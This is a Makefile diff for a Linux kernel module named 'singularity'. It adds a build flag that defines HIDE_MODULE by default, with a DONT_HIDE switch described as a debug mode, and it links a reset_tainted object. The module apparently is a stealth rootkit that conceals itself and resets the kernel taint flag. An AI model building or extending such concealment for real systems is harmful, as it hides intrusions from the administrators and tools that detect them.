@@ -1,8 +1,15 @@
 obj-m += singularity.o
 
+# essentially a debug mode
+ifdef DONT_HIDE
+else
+	MODE_DEFS = -DHIDE_MODULE=1
+endif
+
 ccflags-y := -std=gnu99 \
 	-Wno-declaration-after-statement \
-	-fvisibility=hidden
+	-fvisibility=hidden \
+	$(MODE_DEFS)
 
 singularity-objs := main.o \
     modules/reset_tainted.o \
